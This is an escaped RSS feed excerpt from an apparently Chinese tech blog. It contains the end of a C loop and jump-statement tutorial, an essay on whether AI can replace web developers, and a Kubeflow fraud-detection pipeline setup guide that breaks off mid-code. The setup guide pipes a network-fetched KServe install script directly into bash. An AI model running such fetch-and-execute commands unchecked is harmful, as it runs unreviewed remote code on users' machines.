&lt;/div&gt;&lt;h3 id=&#34;3-do-while循环&#34;&gt;3. do-while循环
&lt;/h3&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;do&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;c1&#34;&gt;// 至少执行一次
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;while&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;condition&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;跳转语句&#34;&gt;跳转语句
&lt;/h2&gt;&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;语句&lt;/th&gt;
          &lt;th&gt;作用&lt;/th&gt;
          &lt;th&gt;示例&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;break&lt;/td&gt;
          &lt;td&gt;立即退出当前循环/switch&lt;/td&gt;
          &lt;td&gt;&lt;code&gt;if(found) break;&lt;/code&gt;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;continue&lt;/td&gt;
          &lt;td&gt;跳过当前循环剩余部分&lt;/td&gt;
          &lt;td&gt;&lt;code&gt;if(i%2==0) continue;&lt;/code&gt;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;goto&lt;/td&gt;
          &lt;td&gt;跳转到指定标签（慎用）&lt;/td&gt;
          &lt;td&gt;&lt;code&gt;goto error_handler;&lt;/code&gt;&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;h2 id=&#34;高级应用技巧&#34;&gt;高级应用技巧
&lt;/h2&gt;&lt;h3 id=&#34;1-控制语句与数组结合&#34;&gt;1. 控制语句与数组结合
&lt;/h3&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;// 查找数组最大值
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;for&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;++&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;arr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;max&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;max&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;arr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h3 id=&#34;2-错误处理模式&#34;&gt;2. 错误处理模式
&lt;/h3&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;FILE&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;file&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;fopen&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;data.txt&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;r&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;file&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;NULL&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nf&#34;&gt;printf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;文件打开失败&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;常见问题解答&#34;&gt;常见问题解答
&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;Q: break和continue有什么区别？&lt;/strong&gt;&lt;br&gt;
A: break会完全终止循环，而continue仅跳过当前迭代&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Q: 如何避免无限循环？&lt;/strong&gt;&lt;br&gt;
A: 确保循环条件最终会变为假，例如：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;i&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;while&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;10&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;  &lt;span class=&#34;c1&#34;&gt;// 必须有终止条件
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;++&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;         &lt;span class=&#34;c1&#34;&gt;// 循环变量必须更新
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;strong&gt;Q: switch-case比if-else效率高吗？&lt;/strong&gt;&lt;br&gt;
A: 在多条件判断时（&amp;gt;5个分支），switch通常生成更高效的跳转表代码&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;最佳实践提示：始终用大括号包裹控制语句体，即使只有单行代码，这能显著降低逻辑错误风险&lt;/p&gt;&lt;/blockquote&gt;
</description>
        </item>
        <item>
        <title>AI能否取代Web开发者：当前工具与局限性的实践探讨</title>
        <link>http://localhost:1313/p/ai%E8%83%BD%E5%90%A6%E5%8F%96%E4%BB%A3web%E5%BC%80%E5%8F%91%E8%80%85%E5%BD%93%E5%89%8D%E5%B7%A5%E5%85%B7%E4%B8%8E%E5%B1%80%E9%99%90%E6%80%A7%E7%9A%84%E5%AE%9E%E8%B7%B5%E6%8E%A2%E8%AE%A8/</link>
        <pubDate>Mon, 04 Aug 2025 07:35:36 +0800</pubDate>
        
        <guid>http://localhost:1313/p/ai%E8%83%BD%E5%90%A6%E5%8F%96%E4%BB%A3web%E5%BC%80%E5%8F%91%E8%80%85%E5%BD%93%E5%89%8D%E5%B7%A5%E5%85%B7%E4%B8%8E%E5%B1%80%E9%99%90%E6%80%A7%E7%9A%84%E5%AE%9E%E8%B7%B5%E6%8E%A2%E8%AE%A8/</guid>
        <description>&lt;h2 id=&#34;ai在web开发中的当前角色&#34;&gt;AI在Web开发中的当前角色
&lt;/h2&gt;&lt;p&gt;AI作为具有惊人能力的前沿技术，正在通过其卓越的应用案例改变世界并提升各行业生产效率。如今每位开发者都倾向于使用AI工具，以便在更短时间内为客户交付更多解决方案。但这也引发了一个严肃的问题：AI能否完全取代Web开发者？&lt;/p&gt;
&lt;h3 id=&#34;网站构建工具&#34;&gt;网站构建工具
&lt;/h3&gt;&lt;p&gt;Wix ADI等AI驱动的建站工具能自动生成网站设计布局和图像，简化设计流程。使用这些工具时，用户无需编码技能，只需具备设计审美和页面整合理解能力即可构建简单网站。这些工具还会逐步提供设计建议，帮助持续优化网站。&lt;/p&gt;
&lt;h3 id=&#34;代码生成与自动化工具&#34;&gt;代码生成与自动化工具
&lt;/h3&gt;&lt;p&gt;代码生成是AI技术的重大进步，82%的开发者主要依赖自动化工具来生成、优化和加速编码流程。Github CoPilot、ChatGPT和Tabnine等工具能在IDE中提供上下文感知的代码建议，提升开发效率，实施语言最佳实践并交付更高质量的代码。&lt;/p&gt;
&lt;h3 id=&#34;ai驱动的uiux设计&#34;&gt;AI驱动的UI/UX设计
&lt;/h3&gt;&lt;p&gt;虽然没有任何AI模型能匹配人类的创意水平，但Figma AI和Adobe Sensei等工具可以快速提供设计创意，帮助设计师尝试多种布局方案。这些工具还能优化网页布局，从一开始就遵循无障碍设计标准。&lt;/p&gt;
&lt;h3 id=&#34;ai驱动的测试&#34;&gt;AI驱动的测试
&lt;/h3&gt;&lt;p&gt;AI测试工具能帮助发现关键边界案例，提升应用测试覆盖率。开发者还可以通过AI模型模拟用户测试，验证网站是否提供良好的用户体验。&lt;/p&gt;
&lt;h3 id=&#34;内容与seo优化&#34;&gt;内容与SEO优化
&lt;/h3&gt;&lt;p&gt;Clearscope和Jasper AI等工具能识别行业热门关键词，围绕这些关键词构建内容以提升搜索排名。AI模型能理解搜索引擎算法，建议内容修改方案以增强竞争力。&lt;/p&gt;
&lt;h2 id=&#34;ai在web开发中的优势&#34;&gt;AI在Web开发中的优势
&lt;/h2&gt;&lt;h3 id=&#34;缩短开发时间&#34;&gt;缩短开发时间
&lt;/h3&gt;&lt;p&gt;AI工具显著加快开发速度，使团队能在更短时间内交付更多项目。&lt;/p&gt;
&lt;h3 id=&#34;提升可访问性&#34;&gt;提升可访问性
&lt;/h3&gt;&lt;p&gt;自动生成图片替代文本、分析修复色彩对比度，确保网页兼容屏幕阅读器等辅助设备。&lt;/p&gt;
&lt;h3 id=&#34;成本效益&#34;&gt;成本效益
&lt;/h3&gt;&lt;p&gt;长期来看，AI自动化能减少测试周期、应用构建时间和SEO优化成本。&lt;/p&gt;
&lt;h2 id=&#34;ai工具的局限性&#34;&gt;AI工具的局限性
&lt;/h2&gt;&lt;h3 id=&#34;缺乏创造力&#34;&gt;缺乏创造力
&lt;/h3&gt;&lt;p&gt;AI只能对现有人类创意设计进行重组，无法创造定制化的原创设计。&lt;/p&gt;
&lt;h3 id=&#34;有限的问题解决能力&#34;&gt;有限的问题解决能力
&lt;/h3&gt;&lt;p&gt;面对大型企业级代码库时，AI调试工具的局限性会快速显现。它们仅能有效处理已训练过的技术栈。&lt;/p&gt;
&lt;h3 id=&#34;伦理问题&#34;&gt;伦理问题
&lt;/h3&gt;&lt;p&gt;存在代码安全、偏见等伦理隐患，公开模型可能记忆并泄露敏感代码。&lt;/p&gt;
&lt;h3 id=&#34;人类依赖性&#34;&gt;人类依赖性
&lt;/h3&gt;&lt;p&gt;AI需要准确输入才能生成预期输出，开发者必须持续审查和测试AI生成的代码。&lt;/p&gt;
&lt;h2 id=&#34;开发者如何适应ai时代&#34;&gt;开发者如何适应AI时代
&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;学习AI工具&lt;/strong&gt;：将GitHub Copilot等工具视为工作效率倍增器&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;理解AI/ML原理&lt;/strong&gt;：认识模型的运作机制和训练数据范围&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;成为全栈开发者&lt;/strong&gt;：掌握API、UI/UX、DevOps和测试等跨领域技能&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;结论&#34;&gt;结论
&lt;/h2&gt;&lt;p&gt;AI工具虽能有效辅助项目启动、文档编写和设计实验，但无法完全取代Web开发者。随着Web开发领域扩展，那些能善用AI工具的多技能开发者将持续保持高需求。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>使用Kubeflow构建AI/ML全生命周期蓝图：从原始数据到模型服务</title>
        <link>http://localhost:1313/p/%E4%BD%BF%E7%94%A8kubeflow%E6%9E%84%E5%BB%BAai/ml%E5%85%A8%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F%E8%93%9D%E5%9B%BE%E4%BB%8E%E5%8E%9F%E5%A7%8B%E6%95%B0%E6%8D%AE%E5%88%B0%E6%A8%A1%E5%9E%8B%E6%9C%8D%E5%8A%A1/</link>
        <pubDate>Mon, 04 Aug 2025 06:58:57 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E4%BD%BF%E7%94%A8kubeflow%E6%9E%84%E5%BB%BAai/ml%E5%85%A8%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F%E8%93%9D%E5%9B%BE%E4%BB%8E%E5%8E%9F%E5%A7%8B%E6%95%B0%E6%8D%AE%E5%88%B0%E6%A8%A1%E5%9E%8B%E6%9C%8D%E5%8A%A1/</guid>
        <description>&lt;h1 id=&#34;从原始数据到模型服务基于kubeflow的aiml全生命周期蓝图&#34;&gt;从原始数据到模型服务：基于Kubeflow的AI/ML全生命周期蓝图
&lt;/h1&gt;&lt;p&gt;本文将指导您使用Kubeflow和Feast等开源工具构建可复现的机器学习工作流，从原始数据开始直至部署生产就绪的模型服务。&lt;/p&gt;
&lt;h2 id=&#34;项目概述&#34;&gt;项目概述
&lt;/h2&gt;&lt;p&gt;本项目实现了欺诈检测用例的完整MLOps工作流。欺诈检测是金融服务中的关键应用，需要实时识别潜在欺诈交易，同时最小化误报。&lt;/p&gt;
&lt;p&gt;我们的欺诈检测系统利用机器学习分析大量交易数据，从历史行为中学习模式，并标记异常交易。该系统需要：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;实时推理：交易发生时即时决策&lt;/li&gt;
&lt;li&gt;特征一致性：训练和推理使用相同特征&lt;/li&gt;
&lt;li&gt;可扩展性：处理高交易量&lt;/li&gt;
&lt;li&gt;持续学习：随欺诈模式演变定期重新训练&lt;/li&gt;
&lt;li&gt;合规性：全面的模型跟踪和治理&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;为什么选择kubeflow&#34;&gt;为什么选择Kubeflow？
&lt;/h2&gt;&lt;p&gt;Kubeflow抽象了Kubernetes基础设施的复杂性，让数据科学家和ML工程师能够专注于数据和模型性能。&lt;/p&gt;
&lt;p&gt;关键优势：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;基础设施抽象：将ML工作流定义为代码，Kubeflow负责在Kubernetes集群上编排执行&lt;/li&gt;
&lt;li&gt;专注于AI而非DevOps&lt;/li&gt;
&lt;li&gt;可重现且可扩展&lt;/li&gt;
&lt;li&gt;生产就绪&lt;/li&gt;
&lt;li&gt;云平台无关&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;准备工作&#34;&gt;准备工作
&lt;/h2&gt;&lt;h3 id=&#34;1-创建本地kubernetes集群&#34;&gt;1. 创建本地Kubernetes集群
&lt;/h3&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;kind create cluster -n fraud-detection-e2e-demo --image kindest/node:v1.31.6
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h3 id=&#34;2-部署kubeflow-pipelines&#34;&gt;2. 部署Kubeflow Pipelines
&lt;/h3&gt;&lt;p&gt;按照官方Kubeflow Pipelines独立安装指南进行部署。&lt;/p&gt;
&lt;h3 id=&#34;3-上传原始数据到minio&#34;&gt;3. 上传原始数据到MinIO
&lt;/h3&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;kubectl port-forward --namespace kubeflow svc/minio-service 9000:9000
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt; synthetic_data_generation
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;uv sync
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;source&lt;/span&gt; .venv/bin/activate
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;python synthetic_data_generation.py
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;cp raw_transaction_datasource.csv ../feature_engineering/feature_repo/data/input
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt; ..
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h3 id=&#34;4-安装模型注册表kserve等组件&#34;&gt;4. 安装模型注册表、KServe等组件
&lt;/h3&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;kubectl apply -k &lt;span class=&#34;s2&#34;&gt;&amp;#34;https://github.com/kubeflow/model-registry/manifests/kustomize/overlays/db?ref=v0.2.16&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;kubectl create namespace kserve
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;kubectl config set-context --current --namespace&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;kserve
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;curl -s &lt;span class=&#34;s2&#34;&gt;&amp;#34;https://raw.githubusercontent.com/kserve/kserve/release-0.15/hack/quick_install.sh&amp;#34;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; bash
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;kubectl config set-context --current --namespace&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;kubeflow
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;构建管道镜像&#34;&gt;构建管道镜像
&lt;/h2&gt;&lt;p&gt;每个管道组件使用专门的容器镜像：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;数据准备(&lt;code&gt;data_preparation/Containerfile&lt;/code&gt;)&lt;/li&gt;
&lt;li&gt;特征工程(&lt;code&gt;feature_engineering/Containerfile&lt;/code&gt;)&lt;/li&gt;
&lt;li&gt;管道(&lt;code&gt;pipeline/Containerfile&lt;/code&gt;)&lt;/li&gt;
&lt;li&gt;REST预测器(&lt;code&gt;rest_predictor/Containerfile&lt;/code&gt;)&lt;/li&gt;
&lt;li&gt;训练(&lt;code&gt;train/Containerfile&lt;/code&gt;)&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;构建示例：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
